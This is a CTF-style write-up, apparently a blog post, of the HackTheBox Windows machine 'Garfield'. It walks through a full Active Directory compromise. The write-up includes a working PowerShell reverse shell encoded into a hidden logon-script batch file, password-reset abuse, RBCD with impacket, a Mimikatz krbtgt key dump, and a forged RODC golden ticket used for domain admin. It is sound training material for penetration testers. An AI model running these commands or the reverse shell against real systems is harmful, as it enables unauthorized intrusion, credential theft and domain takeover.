---
title: "Garfield - HackTheBox Writeup"
date: 2026-07-11 00:00:00 +0000
categories: [boxes]
tags: [windows, active-directory, writeproperty, logon-scripts, scriptpath-hijack, sysvol, forcechangepassword, rbcd, rodc, keylist-attack, golden-ticket, s4u2self, s4u2proxy]
image:
  path: /assets/img/box/25/logo.png
  alt: Garfield HackTheBox Machine
img_path: /assets/img/box/25/
---

![Machine Info](https://img.shields.io/badge/Difficulty-Hard-red) ![Machine Info](https://img.shields.io/badge/OS-Windows-blue)

<p align="center"> <img src="/assets/img/box/25/logo.png" width="150" alt="Garfield Logo"/> </p>

**Platform:** HackTheBox  
**Type:** Machine  
**OS:** Windows / Active Directory  
**Difficulty:** Hard  

This write-up walks through a full Active Directory compromise on Garfield, starting from writable logon-script attributes, pivoting through a domain user escalation chain, and finishing with an RODC-focused KeyList attack that leads to domain admin access.

## 1. Enumeration

### Nmap

```bash
IP="10.129.64.251" ; DOMAIN="garfield.htb" && \
  echo "$IP $DOMAIN DC01.garfield.htb DC01.GARFIELD DC01.GARFIELD.HTB" | sudo tee -a /etc/hosts

nmap -sC -sV -Pn -n -vv -oN $IP.txt $IP
```

The host exposed the expected Windows domain controller surface: DNS, Kerberos, LDAP, SMB, WinRM, and RDP. Time checks also showed a large clock skew, which later mattered for Kerberos ticketing until local time was synchronized.

### Validating credentials and shares

The provided credentials for `j.arbuckle` were valid and gave access to standard domain shares.

```bash
nxc smb $IP -u j.arbuckle -p 'Th1sD4mnC4t!@1978'
nxc smb $IP -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --shares
nxc smb $IP -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --users
```

`SYSVOL` and `NETLOGON` were readable, and the user list included `krbtgt_8245`, which immediately hinted that an RODC was present.

### Writable AD attributes

```bash
bloodyAD --host garfield.htb -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' get writable --detail
```

The important finding was `WriteProperty` on `scriptPath` for `l.wilson`, `l.wilson_adm`, `Guest`, and `krbtgt_8245`.

## 2. Initial Foothold

### Payload preparation

I built a PowerShell reverse shell, encoded it, and wrapped it in a batch file.

```bash
cat > shell.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient("10.10.15.172",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
$client.Close()
EOF

iconv -f ASCII -t UTF-16LE shell.ps1 | base64 -w 0 > shell.b64
echo -e "@echo off\r\npowershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc $(cat shell.b64)" > startupscript.bat
```

### Uploading to SYSVOL

The payload was uploaded to `DC01`'s `SYSVOL` share, specifically under `garfield.htb\scripts`.

```bash
smbclient //DC01.garfield.htb/SYSVOL -U 'garfield.htb\j.arbuckle%Th1sD4mnC4t!@1978'
```

```text
smb: \> cd garfield.htb\scripts
smb: \garfield.htb\scripts\> put startupscript.bat
```

### Setting scriptPath

`scriptPath` was resolved relative to the NETLOGON/SYSVOL scripts directory. A bare filename worked, while a UNC path did not.

```bash
bloodyAD -d garfield.htb --host garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' \
  set object 'CN=Liz Wilson,CN=Users,DC=garfield,DC=htb' scriptPath -v startupscript.bat
```

I applied the same change to each writable account as a shotgun approach.

### Catching the shell

On the next logon cycle, `l.wilson` executed the script and connected back.

```text
whoami
garfield\l.wilson
```

## 3. Tier 1 Escalation

From the `l.wilson` shell, `ForceChangePassword` on `l.wilson_adm` allowed a direct password reset through ADSI.

```powershell
$TargetUser = [ADSI]"LDAP://CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb"
$TargetUser.psbase.Invoke("SetPassword", "YourNewPass123!")
```

That password then worked with WinRM.

```bash
evil-winrm -i garfield.htb -u 'l.wilson_adm' -p 'YourNewPass123!'
```

## 4. RODC Compromise via RBCD

### Discovering the primitive

As `l.wilson_adm`, writable-object enumeration showed direct write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on `RODC01`.

```bash
bloodyAD -d garfield.htb --host garfield.htb -u l.wilson_adm -p 'YourNewPass123!' get writable --detail
```

### Pivoting to the RODC subnet

`RODC01.garfield.htb` resolved to a non-routable management subnet, so I used Ligolo-ng to reach it and added the hostname to `/etc/hosts` for Kerberos consistency.

### RBCD abuse

```bash
impacket-addcomputer -computer-name 'PWNED$' -computer-pass 'Passw0rd123!' \
  -dc-host DC01.garfield.htb garfield.htb/l.wilson_adm:'YourNewPass123!'

impacket-rbcd -delegate-from 'PWNED$' -delegate-to 'RODC01$' -action write \
  -dc-ip 10.129.66.103 garfield.htb/l.wilson_adm:'YourNewPass123!'
```

### Kerberos clock skew

Ticket requests initially failed because of clock skew. Synchronizing time fixed it.

```bash
sudo ntpdate DC01.garfield.htb
```

### S4U2Self / S4U2Proxy

```bash
impacket-getST -spn 'cifs/RODC01.garfield.htb' -impersonate Administrator \
  -dc-ip 10.129.66.103 garfield.htb/'PWNED$':'Passw0rd123!'

export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache

impacket-psexec -k -no-pass -dc-ip 10.129.66.103 RODC01.garfield.htb
```

That landed a SYSTEM shell on `RODC01`.

## 5. Domain Admin via RODC KeyList

### Joining RODC Administrators

`Tier 1` membership allowed adding `l.wilson_adm` to `RODC Administrators`.

```powershell
Add-ADGroupMember -Identity "RODC Administrators" -Members "l.wilson_adm"
```

### Extracting krbtgt_8245

On `RODC01` as SYSTEM, Mimikatz exposed the RODC's `krbtgt_8245` AES256 key.

```text
privilege::debug
lsadump::lsa /inject /name:krbtgt_8245
```

### Modifying the RODC password replication policy

After reconnecting with a fresh WinRM session, I loaded PowerView and updated `msDS-RevealOnDemandGroup` to include `Administrator`, then cleared `msDS-NeverRevealGroup`.

```powershell
Set-DomainObject -Identity RODC01$ -Set @{
    'msDS-RevealOnDemandGroup'=@(
        'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb',
        'CN=Administrator,CN=Users,DC=garfield,DC=htb'
    )
}
Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'
```

### Forging the RODC-scoped ticket

```bash
.[Rubeus.exe golden ^
  /rodcNumber:8245 ^
  /flags:forwardable,renewable,enc_pa_rep ^
  /nowrap ^
  /outfile:ticket.kirbi ^
  /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 ^
  /user:Administrator ^
  /id:500 ^
  /domain:garfield.htb ^
  /sid:S-1-5-21-2502726253-3859040611-225969357
```

### Asking the real DC for a service ticket

```bash
.[Rubeus.exe asktgs /ticket:"ticket_..._Administrator_to_krbtgt@GARFIELD.HTB.kirbi" /service:cifs/DC01.garfield.htb /dc:DC01.garfield.htb /ptt
```

The resulting `cifs/DC01.garfield.htb` service ticket let me authenticate to the real DC from Kali with Impacket.

```bash
impacket-ticketConverter admin_ticket.kirbi admin_ticket.ccache
export KRB5CCNAME=admin_ticket.ccache
impacket-psexec -k -no-pass -dc-ip 10.129.66.103 DC01.garfield.htb
```

## 6. Retrospective

- `scriptPath` write access is a direct code-execution primitive when the target user logs on.
- RBCD is a fast path to machine-account compromise when `msDS-AllowedToActOnBehalfOfOtherIdentity` is writable.
- RODC password replication policy is a high-value target once RODC-administrative rights are in place.
- Kerberos clock skew can block the entire chain if the attacker VM is not time-synced to the target.
- Loopback SMB with injected Kerberos tickets is unreliable, so external validation is the safer path.

## Flag Locations

- User flag: `C:\Users\l.wilson_adm\Desktop\user.txt`
- Root flag: `C:\Users\Administrator\Desktop\root.txt`
